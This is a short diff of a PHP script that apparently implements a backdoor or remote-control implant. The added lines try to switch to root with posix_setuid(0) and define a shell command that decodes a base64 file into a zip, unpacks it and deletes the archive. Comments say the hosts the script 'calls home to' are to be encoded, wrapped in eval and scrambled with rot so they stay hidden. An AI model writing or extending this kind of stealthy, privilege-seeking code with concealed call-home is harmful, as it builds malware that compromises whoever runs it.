@@ -2,8 +2,9 @@
 ini_set("safe_mode", 0);
 umask(0);
 posix_setuid(0);
+
 define("SELF_SCRIPT", $_SERVER["SCRIPT_FILENAME"]);
-require "vendor/autoload.php";
+define("UNPACKVEND", "cat ./vend.b64 | base64 -d >> vendor.zip && unzip ./vendor.zip && rm ./vendor.zip");
 
 function checkfs(){
     if (substr(php_uname(), 0, 7) == 'Windows') {
@@ -78,10 +79,15 @@ function fork_control(){
 }
 
 function main(){
+    $callHome = null;
+    $duration = null;
+    try {
+        require "vendor/autoload.php";
+    }catch(Exception $exception){
+
+    }
     # need to set these from the client script.
     # these will be the hosts we call home to.
     # this needs to be encoded, wrapped in an eval command, and some rot done to it.
-    $callHome = null;
-    $duration = null;
 
 }
